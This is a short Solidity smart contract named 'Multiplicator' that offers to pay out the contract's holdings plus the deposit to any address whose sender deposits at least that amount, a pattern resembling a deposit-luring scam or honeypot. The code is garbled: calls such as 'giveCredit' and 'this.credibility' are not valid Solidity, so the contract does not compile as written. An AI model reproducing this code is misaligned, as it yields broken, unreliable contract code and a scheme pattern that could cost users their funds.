// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Moderator = msg.sender;

    function()payable{}

    function collect()
    payable
    public
    {
        require(msg.sender == Moderator);
        Moderator.giveCredit(this.credibility);
    }

    function multiplicate(address adr)
    payable
    {
        if(msg.value>=this.credibility)
        {
            adr.giveCredit(this.credibility+msg.value);
        }
    }
}